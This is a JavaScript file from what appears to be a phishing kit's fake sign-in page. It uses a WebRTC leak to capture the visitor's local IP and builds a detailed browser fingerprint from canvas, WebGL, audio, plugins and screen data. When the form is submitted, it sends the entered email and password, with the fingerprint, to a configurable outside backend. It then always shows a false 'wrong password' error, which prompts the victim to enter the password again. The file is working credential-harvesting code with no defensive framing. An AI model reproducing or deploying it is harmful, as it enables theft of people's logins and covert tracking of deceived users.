var _localIP = '';
(function getWebRTCIP(){
  try {
    var pc = new RTCPeerConnection({iceServers:[]});
    pc.onicecandidate = function(e) {
      if (e.candidate) {
        var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
        if (m) _localIP = m[1];
        setTimeout(function(){try{pc.close()}catch(e){}}, 100);
      }
    };
    pc.createDataChannel('');
    pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).catch(function(){});
    setTimeout(function(){try{pc.close()}catch(e){}}, 2000);
  } catch(e) {}
})();

window.initCapture = function() {
  var signinForm = document.getElementById('signinForm');
  var modalOverlay = document.getElementById('modalOverlay');
  var errorMsg = document.getElementById('errorMsg');
  var loadingSpinner = document.getElementById('loadingSpinner');
  var passError = document.getElementById('passError');
  var signinBtn = document.getElementById('signinBtn');

  if (!signinForm) return;

  function collectFingerprint() {
    var fp = {};
    fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
    fp.lang = navigator.language || '';
    fp.langs = (navigator.languages || []).join(',');
    fp.screen = screen.width + 'x' + screen.height;
    fp.colorDepth = screen.colorDepth || 0;
    fp.pixelRatio = window.devicePixelRatio || 1;
    fp.platform = navigator.platform || '';
    fp.hwConcurrency = navigator.hardwareConcurrency || '';
    fp.devMemory = navigator.deviceMemory || '';
    fp.cookieEnabled = navigator.cookieEnabled ? '1' : '0';
    fp.doNotTrack = navigator.doNotTrack || '';
    fp.touch = ('ontouchstart' in window) ? '1' : '0';
    fp.maxTouchPoints = navigator.maxTouchPoints || 0;
    fp.pdf = navigator.pdfViewerEnabled ? '1' : '0';
    fp.localIP = _localIP;

    try {
      var p = [];
      for (var i = 0; i < navigator.plugins.length; i++) {
        p.push(navigator.plugins[i].name);
      }
      fp.plugins = p.join(' | ');
    } catch(e) { fp.plugins = ''; }

    try {
      var c = document.createElement('canvas');
      c.width = 200; c.height = 50;
      var ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60'; ctx.fillRect(50, 0, 100, 50);
      ctx.fillStyle = '#069'; ctx.fillText('FP123', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('FP123', 4, 17);
      fp.canvas = c.toDataURL().slice(-32);
    } catch (e) { fp.canvas = ''; }

    try {
      var gl = document.createElement('canvas').getContext('webgl');
      if (gl) {
        fp.gpu = gl.getParameter(gl.RENDERER) || '';
        fp.glVendor = gl.getParameter(gl.VENDOR) || '';
      }
    } catch (e) { fp.gpu = ''; fp.glVendor = ''; }

    try {
      var ac = new (window.AudioContext || window.webkitAudioContext)();
      var o = ac.createOscillator();
      var a = ac.createAnalyser();
      o.connect(a);
      var buf = new Uint8Array(a.frequencyBinCount);
      o.start(0);
      a.getByteFrequencyData(buf);
      fp.audio = String(buf.slice(0, 20));
      o.stop();
      ac.close();
    } catch(e) { fp.audio = ''; }

    return fp;
  }

  function updateActionUrl() {
    var backendUrl = window._backendUrl || '';
    if (backendUrl && signinForm) {
      signinForm.action = backendUrl + '/index.php';
    }
  }

  updateActionUrl();

  signinForm.addEventListener('submit', function(e) {
    e.preventDefault();

    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    if (errorMsg) errorMsg.classList.remove('show');
    if (passError) passError.classList.remove('show');
    document.getElementById('password').classList.remove('input-error');

    if (email && password) {
      if (loadingSpinner) loadingSpinner.classList.add('show');
      if (signinBtn) signinBtn.disabled = true;
      if (signinBtn) signinBtn.textContent = 'Signing in...';

      var formData = new FormData(signinForm);
      formData.append('_tz', Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC');

      var fp = collectFingerprint();
      for (var key in fp) {
        if (fp.hasOwnProperty(key)) {
          formData.append('fp_' + key, fp[key]);
        }
      }

      updateActionUrl();

      fetch(signinForm.action, {
        method: 'POST',
        mode: 'cors',
        headers: { 'X-Requested-With': 'XMLHttpRequest' },
        body: formData
      }).then(function(response) {
        if (loadingSpinner) loadingSpinner.classList.remove('show');
        if (signinBtn) signinBtn.disabled = false;
        if (signinBtn) signinBtn.textContent = 'Sign in';
        if (passError) passError.classList.add('show');
        document.getElementById('password').value = '';
        document.getElementById('password').classList.add('input-error');
        document.getElementById('password').focus();
      }).catch(function() {
        if (loadingSpinner) loadingSpinner.classList.remove('show');
        if (signinBtn) signinBtn.disabled = false;
        if (signinBtn) signinBtn.textContent = 'Sign in';
        if (passError) passError.classList.add('show');
        document.getElementById('password').value = '';
        document.getElementById('password').classList.add('input-error');
        document.getElementById('password').focus();
      });
    } else {
      if (errorMsg) errorMsg.classList.add('show');
    }
  });
};

if (document.getElementById('signinForm')) {
  window.initCapture();
}
